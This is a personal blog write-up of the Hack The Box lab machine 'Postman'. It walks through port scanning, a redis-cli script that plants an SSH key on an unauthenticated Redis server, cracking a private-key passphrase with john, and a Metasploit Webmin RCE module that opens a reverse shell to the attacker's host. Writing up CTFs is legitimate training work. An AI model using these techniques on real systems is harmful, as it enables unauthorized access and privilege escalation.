<p>Hello everyone!</p>

<p>Today, I’m publishing a writeup about the box Postman from <a href="http://hackthebox.eu/">Hackthebox</a>,
    made by <a href="https://www.hackthebox.eu/home/users/profile/114053">TheCyberGeek</a>.</p>

<p>It was rated easy by the maker, and it’s my second one. I got to improve a lot of my skills especially in enumeration,
    and I got the opportunity to discover new tools and services. Let’s get started!<!--more--></p>

<p>As in <a href="{% link _posts/writeups/HTB/2019-11-27-Wall.html %}">HTB: Wall</a>, I’m going to start by adding the IP <code>10.10.10.160</code> in the
    file <code>/etc/hosts</code> in order to access the machine by typing <code>postman.ctf</code>. Now, we can really start.</p>

<p>As usual, we’re going to use nmap to scan all ports, which gives us the following result:</p>

<pre class="prettyprint nocode">

</pre>

<p>So we have HTTP port 80 open with Apache running on it, and something which seems to be another web server,
    running on port 10000. First of all, let’s look at the website using Apache: it’s a basic static website which
    isn’t really interesting. I looked a bit around, tried to enumerate some directories using <code>dirb</code>,
    but nothing relevant.</p>

<p>So I decided that I was going to look at the second website, running on port 10000.
    I came across the following login form:</p>

<img src="/img/{{ page.code }}/webmin.png" alt="Webmin login form" />

<p>So I needed to know what was Webmin, and made some researches. According to Wikipedia<sup><a href="#fn1" id="ref1">1</a></sup>, Webmin is a system
    configuration and management tool. After trying to bruteforce a little bit the form, we got banned for a while,
    which reminded us that usually bruteforcing wasn’t the way to own Hackthebox boxes…</p>

<p>I tried to look for an exploit for Webmin, and I found an interesting vulnerability which allowed to perform
    command injection: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107">CVE-2019-15107</a>,
    which targeted Webmin up to version 1.920. So our version is vulnerable, and
    I thought we were going to use this CVE right now.</p>

<p>However, it didn’t work as planned, and trying to exploit it manually showed us why.
    The CVE worked by injecting commands in the reset password page of Webmin: first, when going on the page
    <code>https://postman.ctf:10000/password_reset.cgi</code>, we are given a security error, which complains about a <code>Referer</code>
    field not being set in the request's header. Using Burpsuite, we can set this <code>Referer</code> field to a valid value, such as
    the website address, and successfully reach the <code>password_change.cgi</code> page:</p>

<img src="/img/{{ page.code }}/pass_change.png" alt="Password changing is disabled" />

<p>That’s sad! I guess the exploit won’t work then. At this moment, I had no idea what to do, and after a while I
    looked at some hints on the Hackthebox forum: people explained that there was another open port
    which wasn’t found by <code>nmap</code>.</p>

<p>I learned about another tool to scan ports: <code>masscan</code><sup><a href="#fn2" id="ref2">2</a></sup>.
    I used the following command to scan the ports again:</p>

<pre class="prettyprint nocode">
$ sudo masscan -p1-10000 10.10.10.160 --rate 10000 -e tun0
Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-12-24 19:31:43 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [10000 ports/host]
Discovered open port 6379/tcp on 10.10.10.160
</pre>

<p><strong>Note:</strong> we have to specify the interface <code>tun0</code> because <code>masscan</code> doesn’t find anything if we don’t;
    guess he’s using the default interface if we don’t tell him.</p>

<p>We found that the port 6379 is open! Browsing Google, we find that 6379 is the default port for the software
    Redis<sup><a href="#fn3" id="ref3">3</a></sup>: basically, it’s a software managing sort of a database. I didn’t find any interesting exploit for this,
    but there is a much easier way to get a shell: the tool <code>redis-cli</code> allows to manage the Redis software, and in our
    case, no password is required. So we can easily connect to the server using the following command:</p>

<pre class="prettyprint nocode">
$ redis-cli -h postman.ctf -p 6379
postman.ctf:6379>
</pre>

<p>Now, we need to think a little bit: the Redis software comes with a user <code>redis</code>, whose home is in <code>/var/lib/redis</code>.
    So basically, if we are able to write something to the file <code>/var/lib/redis/.ssh/authorized_keys</code>, we should be able
    to SSH to the user <code>redis</code>' account.</p>

<p>So first, we’re going to generate a pair of RSA public/private keys, and we’ll put the public key in a file <code>foo.txt</code>.
    Then, we can write a small bash script which will do what we explained just above:</p>

<pre class="prettyprint">
#!/bin/bash

redis-cli -h postman.ctf -p 6379 flushall
&lt;foo.txt redis-cli -h postman.ctf -p 6379 -x set bb
redis-cli -h postman.ctf -p 6379 config set dir "/var/lib/redis/.ssh"
redis-cli -h postman.ctf -p 6379 config set dbfilename "authorized_keys"
redis-cli -h postman.ctf -p 6379 save
</pre>

<p>The script explained:</p>
<ul>
    <li>we remove all the keys currently saved in the database: this allows us to perform our operations in a clean environment;</li>
    <li>we create a key in the database called bb which would contain our public key;</li>
    <li>we change directory to the .ssh directory of the redis user;</li>
    <li>we set the filename in which we want to write data to authorized_keys;</li>
    <li>we write the content of the keys in the file.</li>
</ul>

<p>When we execute this script, each line should print the string “OK” in the terminal.
    When everything is all right, we can connect with SSH to the <code>redis</code> user:</p>

<pre class="prettyprint nocode">
$ ssh -i id_rsa redis@postman.ctf
redis@Postman:~$
</pre>

<p>We got a low-privileged shell!</p>

<p>Let’s change directory to <code>/home</code>: we find that there’s a user called Matt.</p>

<pre class="prettyprint nocode">
redis@Postman:/home$ ls -l
total 4
drwxr-xr-x 6 Matt Matt 4096 Sep 11 11:28 Matt
</pre>

<p>His home directory is executable and readable for everybody! When we browse to Matt’s home directory, we find a
    file <code>user.txt</code>, containing the user flag. We just have to read it:</p>

<pre class="prettyprint nocode">
redis@Postman:/home/Matt$ cat user.txt
cat: user.txt: Permission denied
</pre>

<p>Oh no! We have to find another way to read this file. I was stuck for a very long time at this step because
    I couldn’t find anything interesting. At last, I looked in the <code>/opt</code> folder, which contained a file called <code>id_rsa.bak</code>.
    This must be a RSA private key file. Reading the content of the file, we learn that the file is an encrypted
    private key. We use the tool <code>ssh2john</code> to get the hash of the passphrase:</p>

<pre class="prettyprint nocode">
$ ssh2john id_rsa.bak > hash
$ cat hash
id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc[...]b4c8538da3ab44d63
</pre>

<p>Then the hash is easily cracked using <code>john</code> and the wordlist rockyou:</p>

<pre class="prettyprint nocode">
$ john --wordlist=rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])

finding a possible candidate.

</pre>

<p>So now that we found the passphrase for the private key, we’re going to try connecting to the user Matt by SSH:
    it doesn’t work, the server instantly closes the connection. This might be because the user Matt isn’t allowed
    to connect to the machine through SSH.</p>

<p>I then noticed that when I try to connect to the Webmin panel using the login Matt and the password computer2008,
    it works: the Wikipedia page tells us that Webmin is an adminstration tool for users as well, so it doesn’t
    surprise me that users can connect to it using their usual credentials. We can then guess that computer2008 might
    be the actual password of the user Matt on the machine. Let’s check that: we connect to the <code>redis</code> user by SSH
    using the previous way, then we type:</p>

<pre class="prettyprint nocode">
$ su Matt
Password: computer2008
Matt@Postman:/var/lib/redis$ cat ~/user.txt
517ad[-- REDACTED --]a2f3c
</pre>

<p>So we guessed right, and we owned user! Now, let’s own root.</p>

<p>Starting from this point, I wanted so badly to use the first exploit I mentioned at the beginning of this post,
    that I got stuck for some days. However, I realised that there might be other exploits that could work!
    In fact, there was another RCE using the package update functionality of Webmin: <a href="https://www.cvedetails.com/cve/CVE-2019-12840/">CVE-2019-12840</a>.
    With this exploit, we can use remote code execution in order to get a high privilege shell.
    For this box, we’re going to use Metasploit, as there already exists a module which does the work.</p>

<p>As it’s one of the first times I’m using Metasploit, I’m going to explain in details the commands I use.
    First, after having launched the console with <code>sudo msfconsole</code>, we search for the modules targetting Webmin:</p>

<pre class="prettyprint nocode">
msf5 > search webmin

</pre>

<p>We find the exploit we want to use, and we show what parameters we have to set in order to use it:</p>

<pre class="prettyprint nocode">
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > show options
Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910
</pre>

<p>So as this is an authenticated RCE, we need to set the fields <code>password</code> and <code>username</code>.
    Then, we don’t forget that the Webmin interface must be accessed through HTTPS, so we set the <code>SSL</code> field to <code>true</code>.
    Obviously, we must set <code>RHOSTS</code> to the address we want to target. Finally, we specifiy the field <code>LHOST</code> which stands
    for the address of the machine to which the remote shell will be opened (our IP address here):</p>

<pre class="prettyprint nocode">
msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set SSL true
SSL => true
msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS postman.ctf
RHOSTS => postman.ctf
msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.16.46
LHOST => 10.10.16.46
</pre>

<p>Then, we use the <code>check</code> command to check whether the target is vulnerable to our exploit:</p>

<pre class="prettyprint nocode">
msf5 exploit(linux/http/webmin_packageup_rce) > check

[*] NICE! Matt has the right to >>Package Update<<
[+] 10.10.10.160:10000 - The target is vulnerable.
</pre>

<p>As we can see, the user Matt has enough privilege to update packages, which is required for this exploit.
    Finally, we can run the exploit using the command <code>run</code> or <code>exploit</code>, and we have our reverse shell!</p>

<pre class="prettyprint nocode">
msf5 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.16.46:4444

cat /root/root.txt
a2577[-- REDACTED --]6ddce
</pre>

<p>And we owned root!</p>

<p>This box was pretty fun and I think I learned a lot about making researches while trying to own it. I hope that this writeup could have been useful for some of you!</p>

<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
